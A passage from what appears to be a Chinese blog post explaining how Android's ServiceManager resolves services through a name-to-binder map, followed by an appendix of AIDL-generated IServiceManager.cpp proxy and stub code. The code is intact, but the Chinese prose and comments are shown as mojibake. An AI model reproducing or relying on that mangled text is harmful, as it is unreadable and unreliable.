_aidl_ret_status;&#125;# ServiceManager::checkService åŒæ ·å’Œ Bp ç«¯æ˜¯å¯¹ç§°çš„æ“ä½œï¼Œä¸‹ä¸€æ­¥èµ°åˆ° ServiceManager.cpp::checkService æ–¹æ³•ä¸­ //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::checkService(const std::string&amp; name, sp&lt;IBinder>* outBinder) &#123; *outBinder = tryGetService(name, false); // returns ok regardless of result for legacy reasons return Status::ok();&#125;# ServiceManager::tryGetService //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppsp&lt;IBinder> ServiceManager::tryGetService(const std::string&amp; name, bool startIfNotFound) &#123; auto ctx = mAccess->getCallingContext(); sp&lt;IBinder> out; Service* service = nullptr; // è°ƒç”¨ mNameToService.find åˆ©ç”¨ id æŸ¥æ‰¾ Service if (auto it = mNameToService.find(name); it != mNameToService.end()) &#123; service = &amp;(it->second); if (!service->allowIsolated) &#123; uid_t appid = multiuser_get_app_id(ctx.uid); bool isIsolated = appid >= AID_ISOLATED_START &amp;&amp; appid &lt;= AID_ISOLATED_END; if (isIsolated) &#123; return nullptr; &#125; &#125; out = service->binder; &#125; if (!mAccess->canFind(ctx, name)) &#123; return nullptr; &#125; // å¦‚æœ Service æ²¡æœ‰å¯åŠ¨çš„è¯å°±å°è¯•å¯åŠ¨ Servicve if (!out &amp;&amp; startIfNotFound) &#123; tryStartService(name); &#125; if (out) &#123; // Setting this guarantee each time we hand out a binder ensures that the client-checking // loop knows about the event even if the client immediately drops the service service->guaranteeClient = true; &#125; return out;&#125;è€Œå€˜è‹¥æˆ‘ä»¬æ·±ç©¶ mNameToService , å®ƒå¯ä»¥åœ¨ ServiceManager.h æ‰¾åˆ°å®šä¹‰ //platform/frameworks/native/libs/fakeservicemanager/ServiceManager.hclass ServiceManager : public IServiceManager &#123;public: ...private: std::map&lt;String16, sp&lt;IBinder>> mNameToService;&#125;;&#125; // namespace androidè¿™æ ·ä¸€çœ‹åŸæ¥æŸ¥æ‰¾çš„è¿‡ç¨‹å¾ˆç®€å•ï¼Œå°±æ˜¯åœ¨ä¸€ä¸ª map å­—å…¸é‡Œæ‰¾æ‰¾æ˜¯å¦å«æœ‰è¿™ä¸ªé”®ï¼Œå¦‚æœæœ‰çš„è¯ï¼Œå°±æ˜¯æŸ¥æ‰¾æˆåŠŸäº†å¹¶ä¸”è¿”å› IBinder ç±»å‹çš„å€¼ï¼Œæ·»åŠ å‘å­—å…¸ä¸­æ·»åŠ é”®å€¼çš„è¿‡ç¨‹å…¶å®å·²ç»åœ¨æ³¨å†ŒæœåŠ¡çš„æ—¶å€™åšå¥½äº† //platform\\frameworks\\native\\cmds\\servicemanager\\ServiceManager.cppStatus ServiceManager::addService(const std::string&amp; name, const sp&lt;IBinder>&amp; binder, bool allowIsolated, int32_t dumpPriority) &#123; ... // Overwrite the old service if it exists // æ·»åŠ æœåŠ¡ï¼Œä»¥ name ä½œä¸ºç´¢å¼•å€¼ï¼Œä½¿ç”¨ binder ä½œä¸ºå‚æ•°å®ä¾‹åŒ– Service å¯¹è±¡ mNameToService[name] = Service &#123; .binder = binder, .allowIsolated = allowIsolated, .dumpPriority = dumpPriority, .debugPid = ctx.debugPid, &#125;; /* æ£€æŸ¥æœåŠ¡æ³¨å†Œçš„åˆæ³•æ€§ï¼ŒåŒ…æ‹¬ 1. æœåŠ¡æ˜¯å¦å­˜åœ¨ 2. è¯¥æœåŠ¡æ˜¯å¦æ˜¯æœåŠ¡ç«¯æ³¨å†Œçš„ 3. æ˜¯å¦æœ‰åŒåæœåŠ¡å­˜åœ¨ 4. ä¸ºè¯¥æœåŠ¡æ³¨å†Œçš„æ­»äº¡ä»£ç†æ˜¯å¦æˆåŠŸ */ auto it = mNameToRegistrationCallback.find(name); if (it != mNameToRegistrationCallback.end()) &#123; for (const sp&lt;IServiceCallback>&amp; cb : it->second) &#123; mNameToService[name].guaranteeClient = true; // permission checked in registerForNotifications cb->onRegistration(name, binder); &#125; &#125; return Status::ok();&#125;# æ€»ç»“ Client å‘ ServiceManager è·å–æœåŠ¡çš„è¿‡ç¨‹å…¶å®å¾ˆç®€å•ï¼Œä¸»è¦å°±æ˜¯ä¸€ä¸ª map å­—å…¸æŸ¥è¯¢çš„è¿‡ç¨‹ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒClient ä¸ ServiceManager çš„é€šä¿¡ä¹Ÿæ˜¯é€šè¿‡ Binder é©±åŠ¨è¿›è¡Œçš„ # é™„å½• # å®‰å“ç³»ç»Ÿç¼–è¯‘åç”± aidl ç”Ÿæˆçš„ IServiceManager.cpp ç¼–è¯‘ç³»ç»Ÿç‰ˆæœ¬: android-12.0.0_r34 platform/out/soong/.intermediates/frameworks/native/libs/binder/libbinder/android_arm64_armv8-a_shared/gen/aidl/android/os/IServiceManager.cpp #include &lt;android/os/IServiceManager.h>#include &lt;android/os/BpServiceManager.h>namespace android &#123;namespace os &#123;DO_NOT_DIRECTLY_USE_ME_IMPLEMENT_META_INTERFACE(ServiceManager, \"android.os.IServiceManager\")&#125; // namespace os&#125; // namespace android#include &lt;android/os/BpServiceManager.h>#include &lt;android/os/BnServiceManager.h>#include &lt;binder/Parcel.h>#include &lt;android-base/macros.h>namespace android &#123;namespace os &#123;BpServiceManager::BpServiceManager(const ::android::sp&lt;::android::IBinder>&amp; _aidl_impl) : BpInterface&lt;IServiceManager>(_aidl_impl)&#123;&#125;::android::binder::Status BpServiceManager::getService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::checkService(const ::std::string&amp; name, ::android::sp&lt;::android::IBinder>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_checkService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->checkService(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readNullableStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::addService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, bool allowIsolated, int32_t dumpPriority) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeBool(allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_addService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->addService(name, service, allowIsolated, dumpPriority); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::listServices(int32_t dumpPriority, ::std::vector&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeInt32(dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_listServices, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->listServices(dumpPriority, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8VectorFromUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::registerForNotifications(const ::std::string&amp; name, const ::android::sp&lt;::android::os::IServiceCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IServiceCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_registerForNotifications, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->registerForNotifications(name, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::unregisterForNotifications(const ::std::string&amp; name, const ::android::sp&lt;::android::os::IServiceCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IServiceCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_unregisterForNotifications, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->unregisterForNotifications(name, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::isDeclared(const ::std::string&amp; name, bool* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_isDeclared, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->isDeclared(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readBool(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::getDeclaredInstances(const ::std::string&amp; iface, ::std::vector&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(iface); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getDeclaredInstances, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getDeclaredInstances(iface, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8VectorFromUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::updatableViaApex(const ::std::string&amp; name, ::std::optional&lt;::std::string>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_updatableViaApex, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->updatableViaApex(name, _aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readUtf8FromUtf16(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::registerClientCallback(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service, const ::android::sp&lt;::android::os::IClientCallback>&amp; callback) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(::android::os::IClientCallback::asBinder(callback)); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_registerClientCallback, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->registerClientCallback(name, service, callback); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::tryUnregisterService(const ::std::string&amp; name, const ::android::sp&lt;::android::IBinder>&amp; service) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeUtf8AsUtf16(name); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_data.writeStrongBinder(service); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_tryUnregisterService, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->tryUnregisterService(name, service); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;::android::binder::Status BpServiceManager::getServiceDebugInfo(::std::vector&lt;::android::os::ServiceDebugInfo>* _aidl_return) &#123; ::android::Parcel _aidl_data; _aidl_data.markForBinder(remoteStrong()); ::android::Parcel _aidl_reply; ::android::status_t _aidl_ret_status = ::android::OK; ::android::binder::Status _aidl_status; _aidl_ret_status = _aidl_data.writeInterfaceToken(getInterfaceDescriptor()); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = remote()->transact(BnServiceManager::TRANSACTION_getServiceDebugInfo, _aidl_data, &amp;_aidl_reply, 0); if (UNLIKELY(_aidl_ret_status == ::android::UNKNOWN_TRANSACTION &amp;&amp; IServiceManager::getDefaultImpl())) &#123; return IServiceManager::getDefaultImpl()->getServiceDebugInfo(_aidl_return); &#125; if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_ret_status = _aidl_status.readFromParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; if (!_aidl_status.isOk()) &#123; return _aidl_status; &#125; _aidl_ret_status = _aidl_reply.readParcelableVector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; goto _aidl_error; &#125; _aidl_error: _aidl_status.setFromStatusT(_aidl_ret_status); return _aidl_status;&#125;&#125; // namespace os&#125; // namespace android#include &lt;android/os/BnServiceManager.h>#include &lt;binder/Parcel.h>#include &lt;binder/Stability.h>namespace android &#123;namespace os &#123;BnServiceManager::BnServiceManager()&#123; ::android::internal::Stability::markCompilationUnit(this);&#125;::android::status_t BnServiceManager::onTransact(uint32_t _aidl_code, const ::android::Parcel&amp; _aidl_data, ::android::Parcel* _aidl_reply, uint32_t _aidl_flags) &#123; ::android::status_t _aidl_ret_status = ::android::OK; switch (_aidl_code) &#123; case BnServiceManager::TRANSACTION_getService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(getService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_checkService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(checkService(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeStrongBinder(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_addService: &#123; ::std::string in_name; ::android::sp&lt;::android::IBinder> in_service; bool in_allowIsolated; int32_t in_dumpPriority; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_service); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readBool(&amp;in_allowIsolated); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(addService(in_name, in_service, in_allowIsolated, in_dumpPriority)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_listServices: &#123; int32_t in_dumpPriority; ::std::vector&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readInt32(&amp;in_dumpPriority); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(listServices(in_dumpPriority, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeUtf8VectorAsUtf16Vector(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_registerForNotifications: &#123; ::std::string in_name; ::android::sp&lt;::android::os::IServiceCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(registerForNotifications(in_name, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_unregisterForNotifications: &#123; ::std::string in_name; ::android::sp&lt;::android::os::IServiceCallback> in_callback; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; _aidl_ret_status = _aidl_data.readStrongBinder(&amp;in_callback); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(unregisterForNotifications(in_name, in_callback)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_isDeclared: &#123; ::std::string in_name; bool _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_name); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; ::android::binder::Status _aidl_status(isDeclared(in_name, &amp;_aidl_return)); _aidl_ret_status = _aidl_status.writeToParcel(_aidl_reply); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; if (!_aidl_status.isOk()) &#123; break; &#125; _aidl_ret_status = _aidl_reply->writeBool(_aidl_return); if (((_aidl_ret_status) != (::android::OK))) &#123; break; &#125; &#125; break; case BnServiceManager::TRANSACTION_getDeclaredInstances: &#123; ::std::string in_iface; ::std::vector&lt;::std::string> _aidl_return; if (!(_aidl_data.checkInterface(this))) &#123; _aidl_ret_status = ::android::BAD_TYPE; break; &#125; _aidl_ret_status = _aidl_data.readUtf8FromUtf16(&amp;in_iface); if 